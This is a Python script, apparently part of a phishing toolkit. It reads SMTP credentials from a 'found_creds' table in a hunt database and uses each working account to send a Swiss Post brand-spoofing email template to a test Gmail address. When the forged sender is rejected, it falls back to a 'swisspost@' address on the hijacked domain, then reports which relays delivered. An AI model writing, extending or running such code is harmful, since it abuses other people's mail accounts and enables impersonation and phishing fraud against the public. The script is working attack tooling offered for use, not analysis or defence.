#!/usr/bin/env python3
"""Send Swiss Post spoof test to numerique.fiscal@gmail.com via ALL SMTP."""
import sys, os, time, sqlite3
sys.path.insert(0, "/opt/darkvasend")

from auditguard.campaign_sender import send_clean
from auditguard.spoof_templates import get_template

DB = "/opt/darkvasend/bustgo-hunt.db"
TO = "numerique.fiscal@gmail.com"

tpl = get_template("swisspost")
if not tpl:
    print("ERROR: swisspost template not found")
    sys.exit(1)

db = sqlite3.connect(DB, timeout=10)
db.row_factory = sqlite3.Row
rows = db.execute("SELECT id, smtp_host, smtp_port, smtp_user, smtp_password, context FROM found_creds WHERE auth_ok=1").fetchall()
db.close()

print(f"SWISS POST SPOOF TEST")
print(f"To: {TO}")
print(f"Template: {tpl['brand']}")
print(f"From: {tpl['from_name']} <{tpl['from_email']}>")
print(f"Subject: {tpl['subject']}")
print(f"SMTP: {len(rows)}")
print("=" * 50)

results = []
for r in rows:
    sid = r["id"]
    host = r["smtp_host"]
    port = r["smtp_port"]
    user = r["smtp_user"]
    pwd = r["smtp_password"]
    ctx = (r["context"] or "")[:30]
    
    smtp_config = {
        "host": host, "port": port,
        "username": user, "password": pwd,
        "from_email": user,
    }
    
    # Try spoof mode first (direct, no proxy)
    print(f"\n[#{sid}] {host}:{port} ({ctx})...", end=" ", flush=True)
    
    r1 = send_clean(smtp_config, tpl["from_name"], tpl["from_email"], TO,
                     tpl["subject"], tpl["html"], tpl.get("reply_to", ""), None)
    
    if r1["success"]:
        print("SPOOF OK")
        results.append((sid, host, "SPOOF", ""))
    else:
        err1 = r1.get("error", "?")
        # Try basique mode
        domain = user.split("@")[1] if "@" in user else host
        bas_from = "swisspost@" + domain
        r2 = send_clean(smtp_config, tpl["from_name"], bas_from, TO,
                         tpl["subject"], tpl["html"], tpl.get("reply_to", ""), None)
        if r2["success"]:
            print(f"BASIQUE OK (spoof err: {err1})")
            results.append((sid, host, "BASIQUE", err1))
        else:
            err2 = r2.get("error", "?")
            print(f"FAIL — spoof: {err1} | basique: {err2}")
            results.append((sid, host, "FAIL", f"{err1} / {err2}"))
    
    time.sleep(0.5)

print("\n" + "=" * 50)
print("RESULTATS:")
spoof_ok = [r for r in results if r[2] == "SPOOF"]
bas_ok = [r for r in results if r[2] == "BASIQUE"]
fails = [r for r in results if r[2] == "FAIL"]

print(f"  SPOOF OK:   {len(spoof_ok)}")
for sid, host, _, _ in spoof_ok:
    print(f"    #{sid} {host}")

print(f"  BASIQUE OK: {len(bas_ok)}")
for sid, host, _, err in bas_ok:
    print(f"    #{sid} {host} (spoof err: {err})")

print(f"  FAIL:       {len(fails)}")
for sid, host, _, err in fails:
    print(f"    #{sid} {host} — {err}")

print(f"\nTOTAL ENVOYES: {len(spoof_ok) + len(bas_ok)} / {len(results)}")
